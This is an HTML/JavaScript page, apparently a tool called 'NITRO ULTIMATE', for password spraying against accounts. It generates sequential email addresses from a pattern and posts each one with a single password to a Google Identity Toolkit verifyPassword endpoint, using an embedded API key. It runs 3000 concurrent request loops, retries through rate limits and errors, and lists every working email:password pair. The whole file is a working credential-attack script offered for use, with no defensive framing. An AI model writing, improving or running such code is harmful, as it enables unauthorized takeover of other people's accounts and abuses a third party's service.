<!DOCTYPE html>
<html>
<head>
    <title>NITRO ULTIMATE V13</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #ff0055; font-family: 'Arial', sans-serif; text-align: center; padding: 10px; }
        .main { max-width: 550px; margin: auto; border: 3px solid #ff0055; background: #050505; padding: 20px; box-shadow: 0 0 50px #ff0055; border-radius: 10px; }
        h1 { font-size: 20px; color: #fff; margin: 0; text-shadow: 0 0 10px #ff0055; }
        
        input { width: 100%; padding: 15px; margin: 8px 0; background: #111; border: 1px solid #ff0055; color: #fff; font-size: 16px; text-align: center; outline: none; }
        .btn-launch { width: 100%; padding: 22px; background: #ff0055; color: #fff; border: none; font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 10px; box-shadow: 0 0 20px #ff0055; }
        
        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
        .stat { background: #1a1a1a; padding: 12px; border: 1px solid #333; }
        .stat b { font-size: 35px; color: #fff; display: block; }

        #speed-box { font-size: 14px; color: #00ffcc; font-weight: bold; background: #001a1a; padding: 10px; border-radius: 5px; margin-bottom: 10px; border: 1px solid #00ffcc; }
        #res-box { width: 100%; height: 350px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 13px; margin-top: 10px; white-space: pre; }
    </style>
</head>
<body>

<div class="main">
    <h1>🚀 NITRO ULTIMATE ENGINE</h1>
    <p style="color:#aaa; font-size:10px;">100% SEQUENTIAL | 30 MINS TARGET</p>
    
    <div id="speed-box">SPEED: 0 REQ/SEC</div>
    
    <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
    <input type="text" id="pwd" placeholder="PASSWORD">
    
    <button class="btn-launch" id="btn" onclick="startEngine()">⚡ ACTIVATE NITRO DRIVE</button>

    <div class="monitor">
        <div class="stat">CHECKED<b id="c">0</b></div>
        <div class="stat">FOUND<b id="f">0</b></div>
    </div>

    <textarea id="res-box" readonly placeholder="Ordered Results..."></textarea>
</div>

<script>
    let active = false;
    let checked = 0;
    let found = 0;
    let index = 0;
    let nextToPrint = 0;
    let buffer = new Map();
    let startTime;
    
    // Found അക്കൗണ്ട് വന്നാൽ ശബ്ദം കേൾക്കാൻ
    const alertSound = new Audio('https://actions.google.com/sounds/v1/alarms/beep_short.ogg');

    async function startEngine() {
        if (active) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Fill data!");

        active = true;
        startTime = Date.now();
        document.getElementById('btn').innerText = "🛑 FORCE STOP";
        document.getElementById('btn').style.background = "#fff";
        document.getElementById('btn').style.color = "#000";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- HYPER THREADING: 3000 PARALLEL PIPES ---
        const workers = 3000; 

        for (let i = 0; i < workers; i++) {
            (async function stream() {
                while (active && index < max) {
                    let cur = index++;
                    await fire(fmt, pwd, key, cur, digits);
                }
            })();
        }

        setInterval(() => {
            if (!active) return;
            let elapsed = (Date.now() - startTime) / 1000;
            let speed = Math.round(checked / elapsed);
            document.getElementById('speed-box').innerText = `SPEED: ${speed} REQ/SEC`;
        }, 1000);
    }

    async function fire(fmt, pwd, key, idx, digits) {
        let email = fmt.replace(/\{(\d+)\}/, idx.toString().padStart(digits, '0'));
        
        try {
            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${key}`, {
                method: 'POST',
                body: JSON.stringify({ email: email, password: pwd, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (r.status === 429) return fire(fmt, pwd, key, idx, digits); 

            let d = await r.json();
            buffer.set(idx, { ok: (d && d.idToken), mail: email });

            // --- ATOMIC SEQUENTIAL FLUSH ---
            while (buffer.has(nextToPrint)) {
                let data = buffer.get(nextToPrint);
                if (data.ok) {
                    found++;
                    alertSound.play(); // FOUND ALERT!
                    document.getElementById('f').innerText = found;
                    document.getElementById('res-box').value += data.mail + ":" + pwd + "\n";
                    document.getElementById('res-box').scrollTop = document.getElementById('res-box').scrollHeight;
                }
                checked++;
                if (checked % 10 === 0) document.getElementById('c').innerText = checked;
                
                buffer.delete(nextToPrint);
                nextToPrint++;
            }

        } catch (e) {
            return fire(fmt, pwd, key, idx, digits); 
        }
    }
</script>
</body>
</html>
